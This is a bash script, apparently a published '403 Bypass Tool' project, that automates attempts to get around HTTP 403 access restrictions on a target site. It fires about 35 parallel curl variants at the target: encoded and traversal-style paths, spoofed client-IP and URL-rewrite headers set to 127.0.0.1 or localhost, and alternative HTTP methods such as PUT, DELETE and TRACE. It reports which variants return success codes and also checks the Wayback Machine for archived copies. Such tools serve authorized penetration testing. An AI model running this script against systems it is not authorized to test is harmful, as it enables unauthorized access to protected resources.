#!/bin/bash
# 403 Bypass Tool - Performance Edition
# Optimized for speed and efficiency

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Print banner
print_banner() {
    echo -e "${BLUE}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                      🚀 WEB 403 BYPASS TOOL - PERFORMANCE EDITION 🚀         ║"
    echo "║                         Advanced Real-World Forbidden Bypass                ║"
    echo "║                                                                              ║"
    echo "║  🎯 Author: mrx-arafat                                                       ║"
    echo "║  🌐 GitHub: https://github.com/mrx-arafat/Web-403-Bypass-Tool               ║"
    echo "║  📦 Version: 4.0.0 - Performance Edition                                    ║"
    echo "║  ⚡ Optimized with Parallel Processing & Smart Caching                       ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${CYAN}Usage: bash bypass-403.sh <url> <endpoint> [options]${NC}"
    echo -e "${CYAN}Options:${NC}"
    echo -e "  -t, --threads NUM     Number of parallel requests (default: 5)"
    echo -e "  -d, --delay NUM       Delay between requests in seconds (default: 0.2)"
    echo -e "  -o, --output FILE     Output results to file"
    echo -e "  -v, --verbose         Verbose output"
    echo ""
}

# Function to send HTTP request with improved output
send_request() {
    local url="$1"
    local options="$2"
    local technique="$3"
    
    # Generate a cache key based on URL and options
    local cache_key="${url}${options}"
    local cache_file="/tmp/bypass403_$(echo $cache_key | md5sum | cut -d' ' -f1)"
    
    # Check if we have a cached result
    if [ -f "$cache_file" ]; then
        local cached_result=$(cat "$cache_file")
        echo -e "${YELLOW}[CACHED] ${cached_result}${NC}"
        return
    fi
    
    # Execute the request with timing
    local start_time=$(date +%s.%N)
    local result=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download},%{time_total}" $options "$url" 2>/dev/null)
    local end_time=$(date +%s.%N)
    
    # Parse the result
    local status_code=$(echo $result | cut -d',' -f1)
    local size=$(echo $result | cut -d',' -f2)
    local time=$(echo $result | cut -d',' -f3)
    
    # Determine if the bypass was successful
    local success_marker=""
    if [[ "$status_code" == "200" || "$status_code" == "201" || "$status_code" == "202" || "$status_code" == "204" ]]; then
        success_marker="${GREEN}[SUCCESS]${NC}"
        echo -e "$success_marker $technique - Status: $status_code, Size: $size bytes, Time: ${time}s"
        echo -e "  --> ${url} ${options}"
        
        # Save successful bypasses to a separate file
        if [ ! -z "$OUTPUT_FILE" ]; then
            echo "[SUCCESS] $technique - $url $options - Status: $status_code, Size: $size bytes" >> "${OUTPUT_FILE}"
        fi
    elif [[ "$VERBOSE" == "true" ]]; then
        echo -e "${RED}[FAILED]${NC} $technique - Status: $status_code, Size: $size bytes, Time: ${time}s"
        echo -e "  --> ${url} ${options}"
    fi
    
    # Cache the result
    echo "$technique - Status: $status_code, Size: $size bytes, Time: ${time}s" > "$cache_file"
}

# Function to run requests in parallel
run_parallel() {
    local commands=("$@")
    local num_commands=${#commands[@]}
    local i=0
    
    # Create a temporary directory for job control
    local tmp_dir=$(mktemp -d)
    
    # Process commands in batches
    while [ $i -lt $num_commands ]; do
        local running=0
        local jobs_pids=()
        
        # Start up to MAX_PARALLEL jobs
        while [ $running -lt $MAX_PARALLEL ] && [ $i -lt $num_commands ]; do
            eval "${commands[$i]}" &
            local pid=$!
            jobs_pids+=($pid)
            let running+=1
            let i+=1
        done
        
        # Wait for all jobs in this batch to complete
        for pid in "${jobs_pids[@]}"; do
            wait $pid
        done
        
        # Add a small delay between batches
        sleep $DELAY
    done
    
    # Clean up
    rm -rf "$tmp_dir"
}

# Parse command line arguments
MAX_PARALLEL=5
DELAY=0.2
VERBOSE=false
OUTPUT_FILE=""

# Base URL and endpoint are required
if [ $# -lt 2 ]; then
    print_banner
    exit 1
fi

BASE_URL=$1
ENDPOINT=$2
shift 2

# Parse optional arguments
while [ $# -gt 0 ]; do
    case "$1" in
        -t|--threads)
            MAX_PARALLEL=$2
            shift 2
            ;;
        -d|--delay)
            DELAY=$2
            shift 2
            ;;
        -o|--output)
            OUTPUT_FILE=$2
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        *)
            echo "Unknown option: $1"
            print_banner
            exit 1
            ;;
    esac
done

# Print banner and configuration
print_banner
echo -e "${CYAN}🎯 Target: ${BASE_URL}/${ENDPOINT}${NC}"
echo -e "${CYAN}🧵 Parallel Threads: ${MAX_PARALLEL}${NC}"
echo -e "${CYAN}⏳ Delay: ${DELAY}s${NC}"
if [ ! -z "$OUTPUT_FILE" ]; then
    echo -e "${CYAN}📄 Output File: ${OUTPUT_FILE}${NC}"
    # Initialize output file
    echo "# 403 Bypass Tool - Results for ${BASE_URL}/${ENDPOINT}" > "${OUTPUT_FILE}"
    echo "# Generated on $(date)" >> "${OUTPUT_FILE}"
    echo "# =======================================================" >> "${OUTPUT_FILE}"
fi
echo ""

# Create an array of commands to run
commands=(
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"\" \"Basic Path\""
    "send_request \"${BASE_URL}/%2e/${ENDPOINT}\" \"\" \"URL Encoded Dot\""
    "send_request \"${BASE_URL}/${ENDPOINT}/.\" \"\" \"Trailing Dot\""
    "send_request \"${BASE_URL}//${ENDPOINT}//\" \"\" \"Double Slash\""
    "send_request \"${BASE_URL}/./${ENDPOINT}/./\" \"\" \"Current Directory\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Original-URL: ${ENDPOINT}\\\"\" \"X-Original-URL Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Custom-IP-Authorization: 127.0.0.1\\\"\" \"X-Custom-IP-Authorization Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Forwarded-For: http://127.0.0.1\\\"\" \"X-Forwarded-For Header (URL)\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Forwarded-For: 127.0.0.1:80\\\"\" \"X-Forwarded-For Header (IP:Port)\""
    "send_request \"${BASE_URL}\" \"-H \\\"X-rewrite-url: ${ENDPOINT}\\\"\" \"X-rewrite-url Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}%20\" \"\" \"URL Encoded Space\""
    "send_request \"${BASE_URL}/${ENDPOINT}%09\" \"\" \"URL Encoded Tab\""
    "send_request \"${BASE_URL}/${ENDPOINT}?\" \"\" \"Query Parameter\""
    "send_request \"${BASE_URL}/${ENDPOINT}.html\" \"\" \"HTML Extension\""
    "send_request \"${BASE_URL}/${ENDPOINT}/?anything\" \"\" \"Path Parameter\""
    "send_request \"${BASE_URL}/${ENDPOINT}#\" \"\" \"Fragment Identifier\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"Content-Length:0\\\" -X POST\" \"POST with Content-Length:0\""
    "send_request \"${BASE_URL}/${ENDPOINT}/*\" \"\" \"Wildcard\""
    "send_request \"${BASE_URL}/${ENDPOINT}.php\" \"\" \"PHP Extension\""
    "send_request \"${BASE_URL}/${ENDPOINT}.json\" \"\" \"JSON Extension\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-X TRACE\" \"TRACE Method\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Host: 127.0.0.1\\\"\" \"X-Host Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}..;/\" \"\" \"Path Traversal with Semicolon\""
    "send_request \"${BASE_URL}/${ENDPOINT};/\" \"\" \"Path with Semicolon\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"Host: localhost\\\"\" \"Host: localhost Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Forwarded-Host: 127.0.0.1\\\"\" \"X-Forwarded-Host Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-X PUT\" \"PUT Method\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-X DELETE\" \"DELETE Method\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-X OPTIONS\" \"OPTIONS Method\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-X PATCH\" \"PATCH Method\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"CF-Connecting-IP: 127.0.0.1\\\"\" \"CF-Connecting-IP Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"True-Client-IP: 127.0.0.1\\\"\" \"True-Client-IP Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-ProxyUser-Ip: 127.0.0.1\\\"\" \"X-ProxyUser-Ip Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Remote-IP: 127.0.0.1\\\"\" \"X-Remote-IP Header\""
    "send_request \"${BASE_URL}/${ENDPOINT}\" \"-H \\\"X-Client-IP: 127.0.0.1\\\"\" \"X-Client-IP Header\""
)

# Run commands in parallel
echo -e "${BLUE}🚀 Starting bypass tests with parallel processing...${NC}\n"
run_parallel "${commands[@]}"

# Check Wayback Machine
echo -e "\n${BLUE}📚 Checking Wayback Machine archives...${NC}"
wayback_result=$(curl -s "https://archive.org/wayback/available?url=${BASE_URL}/${ENDPOINT}")
available=$(echo $wayback_result | jq -r '.archived_snapshots.closest.available // "false"')
if [ "$available" == "true" ]; then
    url=$(echo $wayback_result | jq -r '.archived_snapshots.closest.url')
    echo -e "${GREEN}[SUCCESS] Wayback Machine archive found!${NC}"
    echo -e "  --> $url"
    
    if [ ! -z "$OUTPUT_FILE" ]; then
        echo "[SUCCESS] Wayback Machine archive found: $url" >> "${OUTPUT_FILE}"
    fi
else
    echo -e "${RED}[FAILED] No Wayback Machine archives found${NC}"
fi

# Print summary
echo -e "\n${BLUE}${BOLD}📊 BYPASS SUMMARY${NC}"
echo "======================================================="
if [ ! -z "$OUTPUT_FILE" ]; then
    success_count=$(grep -c "\[SUCCESS\]" "${OUTPUT_FILE}")
    echo -e "${GREEN}Successful bypasses: $success_count${NC}"
    echo -e "${CYAN}Full results saved to: ${OUTPUT_FILE}${NC}"
fi
echo -e "${YELLOW}Note: Some bypasses might require manual verification${NC}"
echo -e "${BLUE}${BOLD}Happy hacking!${NC}"
